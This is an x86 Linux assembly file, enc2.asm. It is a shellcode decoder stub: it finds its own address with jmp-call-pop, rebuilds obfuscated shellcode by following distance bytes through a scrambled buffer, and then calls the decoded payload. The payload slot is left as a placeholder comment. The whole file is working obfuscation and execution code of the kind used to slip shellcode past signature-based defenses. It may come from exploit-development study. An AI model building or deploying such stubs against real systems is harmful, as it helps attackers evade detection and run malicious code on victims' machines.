;enc2.asm
[SECTION .text]
global _start
_start:
        jmp short ender ; push SC addre on the stack (MY_JMP_ENDER)

starter:

        xor eax, eax    ; clean up the registers
        xor ebx, ebx
        xor edx, edx
        xor ecx, ecx

        pop edx         ; get addr of shellcode (jmp short ender)
        push edx

        mov esi, edx    ; set SC addr
        mov edi, edx    ; set SC addr
        inc esi         ; point to the first dst position
        inc edi         ; point to the first rnd

        mov cl, 200     ; tmp loop counter (MY_CNT)

myloop:
        xor eax, eax
        xor ebx, ebx

        mov al, byte [edi]  ; read distance to next byte
        add eax, edi        ; eax = addr of the next valid byte

        mov bl, byte [eax]  ; bl = next valid byte of the shellcode
        mov byte [esi], bl  ; move it to the final position

        mov edi, eax        ;
        inc edi             ; edi = next distance
        inc esi             ; esi = next position for a valid byte

        loop myloop         ; loop

done:
        pop ecx             ; call shellcode
        call ecx            ;

        xor eax, eax        ; exit the shellcode (if it returns)
        mov al, 1           ;
        xor ebx,ebx         ;
        int 0x80            ;

ender:
        call starter  ; put the address of the string on the stack
        ;db THE_OBFUSCATED_SHELLCODE
